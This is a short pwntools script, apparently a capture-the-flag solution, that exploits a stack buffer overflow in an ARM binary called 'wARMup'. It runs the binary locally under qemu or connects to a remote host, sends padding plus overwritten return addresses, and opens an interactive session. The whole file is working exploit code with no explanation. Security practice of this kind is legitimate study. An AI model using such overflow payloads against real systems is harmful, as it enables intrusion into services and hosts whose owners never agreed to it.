from pwn import *
import sys
context.binary = "wARMup"

if sys.argv[1] == "r":
    io = remote("18.191.89.190", 1337)
elif sys.argv[1] == "l":
    io = process(["qemu-arm", "-L", "./", "./wARMup"])
else:
    io = process(["qemu-arm", "-g", "1234", "-L", "/usr/arm-linux-gnueabi", "your_binary"])

elf = ELF("wARMup")
libc = ELF("lib/libc.so.6")
context.log_level = "debug"

padding = 'a' * (0x68+4)
payload = padding + p32(0x1040c) + p32(0x104f8)
io.sendafter('CTF!\n', payload)

print io.recv()

io.interactive()
